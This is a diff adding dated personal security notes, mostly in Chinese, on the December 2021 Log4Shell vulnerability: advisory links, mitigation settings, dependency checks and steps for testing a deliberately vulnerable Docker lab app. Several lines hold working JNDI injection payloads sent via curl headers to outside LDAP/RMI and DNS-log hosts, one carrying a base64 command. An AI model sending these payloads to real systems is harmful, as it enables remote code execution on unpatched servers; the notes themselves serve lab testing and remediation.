@@ -1,4 +1,108 @@
 # 202112
+## 20211213
+
+https://github.com/christophetd/log4shell-vulnerable-app
+
+docker build . -t vulnerable-app
+docker run -p 8081:8080 --name vulnerable-app vulnerable-app
+
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+curl 127.0.0.1:8081 -H 'X-Api-Version: ${jndi:ldap://78769f89.dns.1433.eu.org:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+这个对应的 https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2
+是已经升级到 2.15.0 的
+
+jdeps /app/spring-boot-application.jar
+jdeps  -summary -recursive /app/spring-boot-application.jar
+
+$ jdeps --class-path 'libs/*' -recursive sh-2.6.3.jar
+
+jar tvf yourjar.jar | perl -nle'BEGIN{$depth=(shift)-1}print join(".", (split(/\//, (split)[-1]))[0..$depth])' 3
+
+https://github.com/BugScanTeam/DNSLog
+
+使用MSSQL加载运行CLR代码
+http://blog.nsfocus.net/mssql-clr/
+
+Apache Shiro 反序列化漏洞详解
+https://paper.seebug.org/1782/
+
+APACHE LOG4J2 远程代码执行漏洞处置手册
+http://blog.nsfocus.net/apache-log4j2/
+
+Apache Solr
+
+Apache Struts2
+
+Apache Flink
+
+Apache Druid
+
+spring-boot-strater-log4j2
+
+## 20211210
+
+Remote code injection in Log4j
+https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+
+【安全通报】Apache Log4j2 远程代码执行漏洞
+https://nosec.org/home/detail/4917.html
+  Vulfocus 靶场环境
+  目前 Vulfocus 已经集成 Log4j2 环境，可通过以下链接启动环境测试：
+  http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c
+
+  漏洞利用及POC验证
+  poc:
+  ${jndi:ldap://xxxxx.dnslog.cn/exp}
+  ${jndi:rmi://xxxxx.dnslog.cn/exp}
+到这里获得一个 地址
+http://dnslog.cn/
+如：mixazx.dnslog.cn
+本地 ping mixazx.dnslog.cn
+Refresh Record，发现有记录
+找一个有 log4j 日志使用的应用，发送
+
+${jndi:ldap://mixazx.dnslog.cn/exp}
+${jndi:rmi://mixazx.dnslog.cn/exp}
+做为参数
+
+Apache Log4j远程代码执行漏洞风险通报信息汇总
+https://www.freebuf.com/articles/308151.html
+
+POC：
+https://www.lunasec.io/docs/blog/log4j-zero-day/
+https://github.com/azhao1981/apache-log4j-poc
+
+【重要通知】关于Apache Log4j 2远程代码执行最新漏洞的风险提示
+https://itsc.nju.edu.cn/7a/42/c41947a555586/page.htm
+【紧急补救措施】
+
+（1）  修改jvm参数 -Dlog4j2.formatMsgNoLookups=true     
+（2）  修改配置log4j2.formatMsgNoLookups=True
+（3）  将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
+  TODO: 需要重启吗？还是写在bash里就可以了
+
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
+https://www.exploit-db.com/exploits/50581
+
+RUBY
+CVE-2021-41816: Buffer Overrun in CGI.escape_html
+https://www.ruby-lang.org/en/news/2021/11/24/buffer-overrun-in-cgi-escape_html-cve-2021-41816/
+CVE-2021-41819: Cookie Prefix Spoofing in CGI::Cookie.parse
+https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/
+
+Apache Shiro 反序列化漏洞详解
+https://paper.seebug.org/1782/
+Apache Storm 漏洞分析
+https://paper.seebug.org/1780/
+Identity Security Authentication Vulnerability
+https://paper.seebug.org/1779/
+
+八个技巧，防止远程办公时泄漏公司数据
+https://www.freebuf.com/news/308054.html
+
+基于容器ATT&CK矩阵模拟攻防对抗的思考
+https://www.anquanke.com/post/id/257799
+
 ## 20211209
 
 https://www.alibabacloud.com/blog/clb-alb-兩種負載平衡產品差異介紹_597952
